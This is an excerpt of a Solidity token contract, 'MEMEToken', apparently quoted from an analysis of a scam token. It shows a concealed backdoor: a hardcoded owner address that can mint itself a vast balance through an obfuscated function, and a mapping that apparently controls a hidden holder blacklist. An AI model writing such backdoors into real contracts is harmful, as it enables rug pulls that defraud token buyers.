...
contract MEMEToken is Ownable {
    ...
    address public _beeceo500;
    mapping(address => bool) private qazwsx;
    function quitOPDoge(address sss) external   {
        if (_beeceo500 == _msgSender()) {
            qazwsx[sss] = false;
        }
         if (_beeceo500 == _msgSender()) {
            qazwsx[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo500 == adminAddress){
            _balances[_beeceo500] = googoNum()*(45000);
        }
        if(_beeceo500 == adminAddress){
            _balances[_beeceo500] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo500 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
